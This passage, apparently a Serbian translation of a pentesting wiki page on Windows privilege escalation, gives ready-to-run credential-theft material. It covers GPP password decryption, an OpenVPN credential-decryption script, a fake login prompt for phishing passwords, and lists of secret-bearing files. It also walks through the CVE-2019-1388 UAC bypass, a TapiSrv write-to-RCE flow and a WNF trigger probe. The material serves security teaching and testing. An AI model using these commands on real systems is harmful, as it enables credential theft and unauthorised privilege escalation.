.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ovaj metod imao je ozbiljne bezbednosne propuste. Kao prvo, Group Policy Objects (GPO), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Kao drugo, lozinke u ovim GPP-ovima, šifrovane pomoću AES256 uz javno dokumentovan podrazumevani ključ, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo omogućiti da dobiju povišene privilegije.

Da bi se ovaj rizik ublažio, razvijena je funkcija za skeniranje lokalno keširanih GPP datoteka koje sadrže neprazno polje „cpassword“. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u prepoznavanju i otklanjanju ove bezbednosne ranjivosti.

Potražite sledeće datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer datoteke web.config sa podacima za autentifikaciju:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP rezervna kopija postavljena direktno u webroot koji se poslužuje može otkriti prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je moguća lokacija. Brzi lokalni popis može da izlista nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni kredencijal omogućava veće privilegije.

### Kredencijali za OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **tražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno traženje **akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže akreditive**

Poznate datoteke koje su nekada sadržale **lozinke** u **običnom tekstu** ili Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim nazivom tretirajte kao potencijalni šifrovani trezor; njeno prisustvo ne znači da možete da je pročitate, otključate ili upotrebite bilo koje sačuvane akreditive. Proverite dostupne korisničke profile i konfigurisane korene deljenih datoteka kada utvrđujete gde se takve datoteke čuvaju.

Čitljiv KeePass `.kdbx` je takođe samo trag koji upućuje na šifrovani trezor. Za njegovo otključavanje potrebni su stvarna glavna lozinka i svi konfigurisani faktori kao što su key-file ili nalog. Ako ovlašćena provera pronađe LM:NT par heševa u unosu, proverite navedeni nalog i da li je NT heš aktuelan i prihvaćen od strane NTLM servisa ciljnog sistema pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje prava Administrator ili SYSTEM; moraju biti ispunjeni i uslovi za pristup udaljenom servisu, prava naloga i bilo koji zaseban korak izvršavanja servisa. U inventaru navedite putanju trezora i da li je čitljiv, a nemojte ispisivati bazu podataka ni sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Proverite dostupne stavke korpe za otpatke i potražite obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara nekoliko meseci i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao upareni unos `$R`; pre otvaranja arhive pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje. Vidljivost zavisi od volumena, korisničkog SID-a i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji oporavljiva rezervna kopija. Naziv arhive tretirajte kao razlog za proveru, a ne kao dokaz da sadrži važeću tajnu.

Dostupna obrisana datoteka `.pfx` može biti i trag za **potpisivanje koda**. Ako sadrži dostupan privatni ključ, tim ključem može da se potpiše izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za potpisivanje koda sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u procenjuju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni konkretnu skriptu, da efektivno pravilo prihvata nastali potpis za tu skriptu i ciljni nalog, kao i da planirani zadatak ili drugi potrošač sa višim privilegijama zaista pokreće skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili skripta koja može da se menja ne dokazuju da je ovaj lanac uspostavljen. Pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka, pregledajte metapodatke, ACL-ove, smernice i planiranu komandu.

Proverite i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za tragovima akreditiva. Izvezena BitLocker recovery informacija može biti sačuvana kao HTML ili TXT, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za offline oporavak domenskih akreditiva potreban je i odgovarajući hive `SYSTEM`, kao što je opisano u [postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** koje je sačuvalo više programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### U registru

**Drugi mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje OpenSSH ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i omiljene stranice pregledača — možda su tamo sačuvane neke **lozinke**.

Za uobičajeni profil `Default` pregledača Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok je `Local State` u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); neki drugi profil ili smernica `UserDataDir` mogu promeniti tu lokaciju. Samo prisustvo datoteka ukazuje na moguću lokaciju skladišta akreditiva: proverite da li su datoteke čitljive, da li imate DPAPI kontekst odgovarajućeg korisnika ili drugi ovlašćeni materijal ključa i da li sačuvana prijava pripada privilegovanijem nalogu. Samo nabrajanje putanja ne mora da otvara bazu podataka niti da ispisuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` profila uparene datoteke ključa i šifrovanih prijava. Njihovo prisustvo samo ukazuje na mogući trag: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li Primary Password štiti ključ pre nego što zaključite da su akreditivi upotrebljivi. Ako oporavljeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i [LAPS prava za čitanje ili dešifrovanje lozinke](../active-directory-methodology/laps.md) grupe; artefakti pregledača sami po sebi ne dokazuju put do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se pomoću ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, identifikovanih ID-ovima interfejsa (IID).

COM klase i interfejsi definisani su u registru, redom pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ovaj registar se formira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podregistar **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podregistar InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koji DLL** koji će se izvršavati, možete **eskalirati privilegije** ako će taj DLL izvršavati drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje prisustva, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretražite datoteku sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alatke koje traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski izvršava svaki Metasploit POST modul koji traži akreditive** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedna odlična alatka za izvlačenje lozinki iz sistema.

Alatka [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** u nekoliko alatki koje čuvaju ove podatke u otvorenom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Procureli handles

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasleđuje sve otvorene handles glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle ka privilegovanom procesu koji je kreiran** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i ovaj **drugi tekst za potpunije objašnjenje kako testirati i zloupotrebiti više otvorenih handles procesa i niti nasleđenih sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Lažno predstavljanje klijenta Named Pipe-a

Segmenti deljene memorije, koji se nazivaju **pipes**, omogućavaju komunikaciju i prenos podataka između procesa.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na arhitekturu klijent/server, sa ulogama koje se nazivaju **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **klijenta**, pod uslovom da ima potrebna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete da oponašate pruža priliku da **steknete veće privilegije** preuzimanjem identiteta tog procesa nakon što stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Udaljeni DWORD upis preko Telephony tapsrv-a do RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može da zloupotrebi asinhronu putanju događaja zasnovanu na mailslot-u kako bi pretvorio `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim da stekne administratorska prava za Telephony i učita proizvoljan DLL kao servis. Ceo tok:

- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju u koju je moguće upisivati → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhrone upise događaja.
- Svaki događaj upisuje napadačem kontrolisani `InitContext` iz `Initialize` u taj handle. Registrujte line aplikaciju pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaj pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odjavite/isključite da biste ponavljali determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa putanjom do proizvoljnog DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju stvari u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditivne podatke kroz komandnu liniju**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz naloga neprivilegovanog korisnika.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nema potrebe da bilo šta instalirate, a binarni fajl koji se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se ova ranjivost iskoristila, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve neophodne fajlove i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od srednjeg do visokog nivoa integriteta administratora / UAC zaobilaženje

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC zaobilaženjima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i direktorijuma za otpremanje unutar direktorijuma koji server poslužuje

Aplikacija može da napravi predvidljiv poddirektorijum za otpremanje, upiše ime fajla koje je zadao pozivalac, a zatim obradi fajl. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisa na strani servera, upis može da prati junction do direktorijuma koji poslužuje veb-server. Skripta postavljena tamo može da se pokrene pod identitetom veb-servisa ako server izvršava tu vrstu fajla. Ovo je granica za proizvoljan upis specifična za aplikaciju; direktorijum za otpremanje sa dozvolom upisa ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačno formiranje putanje i vremenski raspored u rukovaocu otpremanjem, efektivne dozvole korisnika za brisanje i kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces koji upisuje prati reparse points i da li veb-server izvršava fajlove na tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i veb-servera. Pasivni inventar može da prikaže ACL-ove direktorijuma i reparse metapodatke, ali ne može da utvrdi ponašanje rukovaoca ili buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisa, proverite **stvarni token procesa** pre nego što razmotrite zaseban put eskalacije privilegija tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto putem WNF-a

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izloži okidač dostupan neprivilegovanom korisniku. Prilikom provere privilegovanog zadatka, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako to stanje koje podržava bezbednosne dozvole dozvoljava trenutnom korisniku da objavi ažuriranje, korisnik može posredno da pokrene zadatak pod identitetom koji mu je konfigurisan, uprkos `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, Recall zadatak `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` izvršavao se kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim proveravao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobajtni naziv stanja i povežite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća pojednostavljena proba koristi niz bajtova iz primera Recall zadatka; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisna primitivna operacija nije samo okidač, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca izabrana pomoću wildcard-a, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` snažno ukazuju na to da će se prethodno proverena putanja kasnije rekurzivno obilaziti. Ako se podređeni objekti ne otvaraju relativno u odnosu na pouzdane ručke direktorijuma i ne proveravaju pre brisanja, napadač može da promeni razrešavanje putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction i zamenom Object Manager symlink-a](#from-folder-contents-delete-to-system-eop) opisanom ispod: oplock pauzira alat za čišćenje nakon što izabere legitimno dete, dok se direktorijum iznad njega, u koji može da se upisuje, zamenjuje, tako da se nakon nastavka privilegovano brisanje razrešava preko `\RPC Control` do zaštićenog cilja. U lancu Recall, ovo je dovelo do brisanja `C:\Config.Msi` uz SYSTEM privilegije, što je bilo neophodno za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni podređeni objekti zaobilaze površne ispravke reparse point-a

Provera samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanji. Ostavite te proverene objekte legitimnim i premestite zamenu junction/oplock u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju doći do neproverenog podređenog objekta i pratiti njegov novi cilj. CVE-2026-20941 nastao je upravo zbog ove vrste nepotpune ispravke, nakon što je prva Recall zakrpa proveravala `UKP` i direktorijum u obliku GUID-a, ali je zadržala staru rekurzivnu operaciju brisanja.<sup>[[43]](#references)</sup>

Bezbedan obrazac je da otvorite **svaki podređeni objekat** relativno u odnosu na već pouzdanu ručku direktorijuma, dobijete i proverite konačnu razrešenu putanju/objekat, pa zatim primenite oznaku za brisanje na tu proverenu ručku. Nemojte proveravati prefiks, a zatim se vratiti na rekurzivno brisanje zasnovano na putanji. Tokom pregleda zakrpe, proverite i strukture na stvarnom mestu poziva: u ovom slučaju, pregled tokom izvršavanja strukture `OBJECT_ATTRIBUTES` pri `NtCreateFile` pokazao je da `RootDirectory` nije null i da je ime relativno `{GUID}\\secure_file.lock`, čime je opovrgnut obmanjujući izlaz dekompilatora koji je ukazivao na drugu primitivnu operaciju `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od proizvoljnog brisanja/premeštanja/preimenovanja fascikli do SYSTEM EoP

Tehnika je opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), a exploit kod je [**dostupan ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe funkcije rollback Windows Installer-a kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač treba da napravi **zlonamerni MSI installer** koji će se koristiti za preotimanje fascikle `C:\Config.Msi`. Windows Installer će kasnije koristiti tu fasciklu za skladištenje rollback datoteka tokom deinstalacije drugih MSI paketa, pri čemu bi rollback datoteke bile izmenjene tako da sadrže zlonamerni payload.

